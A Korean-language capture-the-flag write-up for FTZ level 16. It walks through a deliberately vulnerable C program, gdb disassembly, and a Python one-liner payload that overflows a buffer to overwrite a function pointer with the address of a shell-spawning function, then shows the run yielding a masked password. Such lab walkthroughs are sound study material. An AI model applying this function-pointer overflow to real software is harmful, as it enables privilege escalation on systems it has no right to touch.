# **FTZ LEVEL16**

## <img src="http://freevector.co/wp-content/uploads/2014/07/61901-door-key.png" width="25"> **Keys**
>attackme.c
```c
#include <stdio.h>
 
void shell() {
  setreuid(3097,3097);
  system("/bin/sh");
}
 
void printit() {
  printf("Hello there!\n");
}
 
main()
{ int crap;
  void (*call)()=printit;
  char buf[20];
  fgets(buf,48,stdin);
  call();
}
```
`call()` 을 호출하는 부분에 `shell()` 의 주소를 넣으면 쉘을 획득활 수 있다.

gdb로 분석하면
```
(gdb) disas main
Dump of assembler code for function main:
0x08048518 <main+0>:	push   ebp
0x08048519 <main+1>:	mov    ebp,esp
0x0804851b <main+3>:	sub    esp,0x38
0x0804851e <main+6>:	mov    DWORD PTR [ebp-16],0x8048500
0x08048525 <main+13>:	sub    esp,0x4
0x08048528 <main+16>:	push   ds:0x80496e8
0x0804852e <main+22>:	push   0x30
0x08048530 <main+24>:	lea    eax,[ebp-56]
0x08048533 <main+27>:	push   eax
0x08048534 <main+28>:	call   0x8048384 <fgets>
0x08048539 <main+33>:	add    esp,0x10
0x0804853c <main+36>:	mov    eax,DWORD PTR [ebp-16]
0x0804853f <main+39>:	call   eax
0x08048541 <main+41>:	leave  
0x08048542 <main+42>:	ret    
0x08048543 <main+43>:	nop    
0x08048544 <main+44>:	nop    
0x08048545 <main+45>:	nop    
0x08048546 <main+46>:	nop    
0x08048547 <main+47>:	nop    
0x08048548 <main+48>:	nop    
0x08048549 <main+49>:	nop    
0x0804854a <main+50>:	nop    
0x0804854b <main+51>:	nop    
0x0804854c <main+52>:	nop    
0x0804854d <main+53>:	nop    
0x0804854e <main+54>:	nop    
0x0804854f <main+55>:	nop    
End of assembler dump.
```
`buf` 의 시작주소는 `ebp-56` 이고, `main+6` 부분에서 `printit()` 의 주소를 `ebp-16` 부분에 넣는다.  
`main+36` 에서 `ebp-16` 부분에 있는 값을 `eax` 에 넣고 호출한다.  
 따라서 `ebp-16` 부분에 `shell()` 의 시작 주소를 넣고 익스플로잇 하겠다. 

 `shell()` 의 시작주소는
 ```
(gdb) disas shell
Dump of assembler code for function shell:
0x080484d0 <shell+0>:	push   ebp
0x080484d1 <shell+1>:	mov    ebp,esp
0x080484d3 <shell+3>:	sub    esp,0x8
0x080484d6 <shell+6>:	sub    esp,0x8
0x080484d9 <shell+9>:	push   0xc19
0x080484de <shell+14>:	push   0xc19
0x080484e3 <shell+19>:	call   0x80483b4 <setreuid>
0x080484e8 <shell+24>:	add    esp,0x10
0x080484eb <shell+27>:	sub    esp,0xc
0x080484ee <shell+30>:	push   0x80485b8
0x080484f3 <shell+35>:	call   0x8048364 <system>
0x080484f8 <shell+40>:	add    esp,0x10
0x080484fb <shell+43>:	leave  
0x080484fc <shell+44>:	ret    
0x080484fd <shell+45>:	lea    esi,[esi]
End of assembler dump.
 ```
 `0x080484d0` 이다.
## <img src="https://pngimg.com/uploads/road/road_PNG24.png" width="25"> **Payload**
>메모리 구조
```
| buf[20] | dummy[20] | &(printit()) | dummy[12] | sfp | ret
```

>Payload
```
(python -c "print 'A'*40+'\xd0\x84\x04\x08'";cat) | ./attackme 
```

## <img src="https://maxcdn.icons8.com/windows8/PNG/512/Military/sword-512.png" width="25"> **Attack**
```
[level16@ftz level16]$ (python -c "print 'A'*40+'\xd0\x84\x04\x08'";cat) | ./attackme 
my-pass

Level17 Password is "~~~~~~~~~".
```
